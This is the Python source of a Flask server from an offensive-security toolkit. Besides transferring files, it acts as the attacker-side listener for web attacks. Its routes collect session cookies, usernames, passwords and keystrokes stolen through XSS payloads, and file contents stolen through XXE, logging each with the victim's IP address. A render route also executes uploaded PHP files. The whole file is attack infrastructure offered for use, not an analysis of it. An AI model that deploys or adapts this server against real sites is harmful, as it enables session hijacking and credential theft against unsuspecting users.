# Author: Tyler McCann (@tylerdotrar)
# Arbitrary Version Number:  4.2.0
# Link: https://github.com/tylerdotrar/PoorMansArmory

# Synopsis:
# Simple Flask web server for bi-directional file transfers (POST and GET),
# supporting both HTTP and HTTPS using self-signed certificates.  Intended
# to be used with the PowerShell WebClient helper script(s), as well as
# templated Web Exploitation (XXE & XXE) payloads.

# Version 4.0.0 introduces Web Exploitation support:
# o  XSS Cookie Exfiltration           (/cookie/<cookie_value>)
# o  XSS Saved Credential Exfiltration (/user/<username>, /password/<password>)
# o  XSS Keylogging                    (/keys/<key>)
# o  XXE Exfiltration                  (/xxe?content=<file_content>)

# Parameters:
# --directory <string>  (default: ./uploads)
# --port <int>          (default: 80)
# --ssl                 (default: false)
# --debug               (default: false)
# --help


import os, flask, argparse, sys
import subprocess, markdown
from flask import request, send_from_directory
from werkzeug.utils import secure_filename
from datetime import datetime    # v4.0.0 (Cookie Exfil)
from urllib.parse import unquote # v4.0.0 (Cookie Exfil)
import subprocess, markdown      # v4.2.0 (File Rendering)


app = flask.Flask(__name__, static_url_path='')


# DOWNLOAD FILES (Classic)
@app.route('/<string:FILE_NAME>', methods=['GET','HEAD'])
def DownloadFile(FILE_NAME):
    path = CLIENT_UPLOADS + '/' + FILE_NAME

    try:
        return send_from_directory(CLIENT_UPLOADS, FILE_NAME, as_attachment=True)
    except FileNotFoundError:
        abort(404)


# UPLOAD FILES (Classic)
@app.route('/<string:FILE_NAME>', methods=['POST'])
def upload_file(FILE_NAME):
    if request.method == 'POST':
        f = request.files['file']

        if FILE_NAME != '':
            f.save(os.path.join(CLIENT_UPLOADS, FILE_NAME))
            return '[+] Upload successful.', 200
        return '[-] Null filename.', 400
    return '[-] Invalid request method.', 405


# UPLOAD/DOWNLOAD (NG)
@app.route('/', methods=['POST', 'GET'])
def file_handler():

    # File Upload
    if request.method == 'POST':
        if 'file' in request.files:
            file = request.files['file']
            if file.filename != '':
                FILE_NAME = file.filename
                file.save(os.path.join(CLIENT_UPLOADS, FILE_NAME))
                return '[+] Upload successful.', 200
            else:
                return '[-] Null filename.', 400
        else:
            return '[-] File not found in request.', 400
    
    # File Download
    elif request.method == 'GET':
        FILE_NAME = request.headers.get('File')
        if FILE_NAME:
            file_path = os.path.join(CLIENT_UPLOADS, FILE_NAME)
            if os.path.exists(file_path):
                #response = send_from_directory(CLIENT_UPLOADS, FILE_NAME)
                #response.headers['Custom-Message'] = '[+] Download successful.'
                #return response, 200
                return send_from_directory(CLIENT_UPLOADS, FILE_NAME)
            else:
                return '[-] File not found.', 404
        else:
            return '[-] File not found in request.', 400


# XSS COOKIE EXFILTRATION
@app.route('/cookie/<string:COOKIE_VALUE>', methods=['GET'])
def ReadCookie(COOKIE_VALUE):
    # Establish Variables
    client_ip = request.remote_addr
    decoded_cookie = unquote(COOKIE_VALUE)
    timestamp = str(datetime.now()) 
    cookie_file = CLIENT_UPLOADS + '/' + 'xss_cookies.txt'

    # Extract to File
    with open(cookie_file, "a") as f:
        f.write(f"IP     : {client_ip}\nCookie : {decoded_cookie}\nTime   : {timestamp}\n\n")
    return '[+] Logged cookie.'


# XSS SAVED CREDENTIAL EXFILTRATION
# - Log username 
@app.route('/user/<string:USER_VALUE>', methods=['GET'])
def ReadUsername(USER_VALUE):
    # Establish Variables
    client_ip = request.remote_addr
    creds_file = CLIENT_UPLOADS + '/' + 'xss_creds.txt'

    # Extract to File
    with open(creds_file, "a") as f:
        f.write(f"IP       : {client_ip}\nUsername : {USER_VALUE}\n")
    return '[+] Logged username.'

# - Log password
@app.route('/pass/<string:PASS_VALUE>', methods=['GET'])                                   
def ReadPassword(PASS_VALUE):
    # Establish Variables
    creds_file = CLIENT_UPLOADS + '/' + 'xss_creds.txt'
    
    # Extract to File
    with open(creds_file, "a") as f:
        f.write(f"Password : {PASS_VALUE}\n\n")                           
    return '[+] Logged password.'


# XSS KEYLOGGING
# - Log characters
@app.route('/keys/<string:KEY_VALUE>', methods=['GET'])
def ReadKeys(KEY_VALUE):
    # Establish Variables
    client_ip = request.remote_addr
    key_file = CLIENT_UPLOADS + '/' + 'xss_keylog.txt'

    # Extract to File
    with open(key_file, "a") as f:
        f.write(f"{KEY_VALUE}")
    return '[+] Logged key.'

# - Log spaces
@app.route('/keys/', methods=['GET'])
def ReadSpace():
    with open(f"xss_keyslogged.txt", "a") as f:
        f.write(f" ")
    return '[+] Logged space.'
 
 
# FILE RENDERING (WIP / PoC)
@app.route('/render/<string:FILE_NAME>')
def RenderFile(FILE_NAME):
    
    file_path = os.path.join(CLIENT_UPLOADS, FILE_NAME)
    if not os.path.exists(file_path):
        return '[-] File not found.', 404

    file_extension = os.path.splitext(FILE_NAME)[1]

    if file_extension == ".php":
        # Render PHP file using PHP interpreter
        out = subprocess.run(["php", file_path], stdout=subprocess.PIPE)
        return out.stdout
    elif file_extension == ".md":
        # Read Markdown file and convert to HTML
        with open(file_path, "r") as f:
            markdown_text = f.read()
        html_content = markdown.markdown(markdown_text)
        return html_content
    elif file_extension == ".html":
        # Render normal HTML
        with open(file_path, "r") as f:
            html_text = f.read()
        return html_text
    else:
        return '[-] Unsupported file type.', 400


# PARAMETERS
if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='Flask-based Web Server for File Transfers, supporting both HTTP and HTTPS via Self-Signed Certificates')
    parser.add_argument('-d', '--directory', default="./uploads", type=str, help='Target file directory (default: ./uploads)')
    parser.add_argument('-p', '--port', default=80, type=int, help='Server port to listen on (default: 80)')
    parser.add_argument('-s', '--ssl', action='store_const', const='adhoc', default=None, help='Enable HTTPS support via self-signed certificates (default: false)')
    parser.add_argument('-D', '--debug', action='store_true', help='Toggle Flask debug mode (default: false)')
    args = parser.parse_args()


    CLIENT_UPLOADS   = os.path.abspath(args.directory)


    # Create './uploads' directory if it does not exist
    if CLIENT_UPLOADS == './uploads':
        if not os.path.isdir(CLIENT_UPLOADS):
            os.mkdir(CLIENT_UPLOADS)
            
    elif not os.path.isdir(CLIENT_UPLOADS):
        print('[-] Could not find directory. Exiting.')
        sys.exit()


    # Confirm Arguments
    print(f'Server Arguments...')
    print(f' * Directory   : {CLIENT_UPLOADS}')
    print(f' * Server Port : {args.port}')
    print(f' * SSL Context : {args.ssl}\n')
    print('Starting Server...')

    app.run(host='0.0.0.0', port=args.port, ssl_context=args.ssl, debug=args.debug)